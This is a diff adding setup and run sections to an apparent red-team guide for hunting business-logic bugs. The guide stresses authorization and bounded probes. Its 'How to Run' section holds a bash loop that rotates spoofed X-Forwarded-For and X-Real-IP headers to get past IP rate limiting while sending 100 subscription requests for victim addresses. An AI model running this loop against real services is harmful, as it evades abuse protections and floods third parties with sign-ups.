@@ -8,6 +8,35 @@ category: redteam
 tags: [business-logic, hunt, redteam]
 ---
 
+## When to Use
+
+- Hunting business logic — heavy emphasis on financial-impact-demonstrated cases.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `python3`, `shodan`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Rotate X-Forwarded-For to bypass IP rate limiting
+for i in $(seq 1 100); do
+  curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/api/subscribe \
+    -H "X-Forwarded-For: 10.0.0.$i" \
+    -H "X-Real-IP: 10.0.0.$i" \
+    -H "Content-Type: application/json" \
+    -d '{"email":"victim+'"$i"'@example.com"}' \
+    -o /dev/null -w "%{http_code}\n"
+done
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 Business logic vulnerabilities pay highest in platforms where financial transactions, identity verification, and access controls intersect with real-world consequences. The richest targets are:
